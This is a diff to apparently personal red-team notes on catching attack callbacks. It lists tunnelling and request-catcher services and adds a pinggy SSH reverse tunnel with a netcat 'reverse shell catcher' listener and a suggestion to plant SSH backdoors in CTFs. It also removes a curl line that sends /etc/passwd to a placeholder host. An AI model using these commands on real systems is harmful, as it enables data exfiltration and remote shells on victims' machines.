@@ -11,23 +11,22 @@ $ nc -lnvp PORT
 <send request to YOUR_PUBLIC_IP:PORT>
 ```
 
-We can use [responder](/cybersecurity/red-team/tools/utilities/networking/responder.md) for Windows Authentication Requests.
+📚 We can use [responder](/cybersecurity/red-team/tools/utilities/networking/responder.md) for Windows Authentication Requests.
+
+⚠️ Remember to use a **SSH backdoor** when available <small>(CTFs, etc.)</small>.
 </div><div>
 
 We may use online public solutions such as API Testing Platforms:
 
 * [requestbin](https://public.requestbin.com/r/) <small>(HTTP 🌍)</small>
 * [postbin](https://www.toptal.com/developers/postbin/) <small>(HTTP 🌍)</small>
-* [ngrok](https://ngrok.com/) <small>(HTTP 🌍 and TCP ⭐, account required 🪦)</small>
+* [ngrok](https://ngrok.com/) <small>(HTTP 🌍 and TCP ⭐, **credit card** required for free plan 💵)</small>
+* [pinggy](https://pinggy.io/) <small>(TCP ⭐, account required ☠️)</small>
 * [requestinspector](https://requestinspector.com/) <small>(HTTP 🌍)</small>
 * [beeceptor](https://beeceptor.com/) <small>(HTTP 🌍)</small>
 * [pastebin](https://pastebin.com/) <small>(HTTP + UPLOAD 🌍, use URL to raw file after upload)</small>
 * [github.io](https://pages.github.com/) <small>(HTTP + UPLOAD 🌍, account required 🪦)</small>
 * ...
-
-```ps
-$ curl http://XXX/xxxxxx -F "data=@/etc/passwd"
-```
 </div></div>
 
 <hr class="sep-both">
@@ -40,4 +39,17 @@ Stuff that I found, but never read/used yet.
 
 * [interactsh](https://app.interactsh.com/#/)
 </div><div>
+
+To use pinggy, create an account to get your SSH command. Run it with `localhost:4444` the final destination of the forwarded traffic.
+
+```shell!
+$ ssh -p 443 -R0:localhost:4444 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 {secret}+tcp@a.pinggy.io
+You will see here the DOMAIN and the PORT to use
+```
+
+It's often a reverse shell catcher such as netcat.
+
+```shell!
+$ nc -lnvp 4444
+```
 </div></div>
